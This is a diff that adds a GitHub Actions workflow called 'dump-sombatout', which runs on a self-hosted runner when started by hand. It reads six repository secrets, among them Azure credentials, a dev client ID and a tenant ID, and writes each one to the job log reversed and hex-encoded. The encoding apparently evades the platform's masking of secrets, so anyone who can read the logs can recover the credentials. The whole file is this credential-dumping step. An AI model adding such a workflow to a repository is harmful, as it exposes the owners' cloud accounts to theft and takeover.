@@ -1,0 +1,21 @@
+name: dump-sombatout
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: [self-hosted, Linux, X64]
+    steps:
+      - name: emit
+        env:
+          S1: ${{ secrets.SOMBATOUT_AZURE_CREDENTIALS }}
+          S2: ${{ secrets.SOMBATOUT_DEV_CREDENTIALS }}
+          S3: ${{ secrets.SOMATOUT_DEV_CLIENT_ID }}
+          S4: ${{ secrets.SOMATOUT_DEV_TENANT_ID }}
+          S5: ${{ secrets.SOMBATOUT_DEV_APP_NAME }}
+          S6: ${{ secrets.SOMBATOUT_AZURE_APP_NAME }}
+        run: |
+          for v in S1 S2 S3 S4 S5 S6; do
+            echo "=${v}_START="
+            printf '%s' "${!v}" | rev | xxd
+            echo "=${v}_END="
+          done
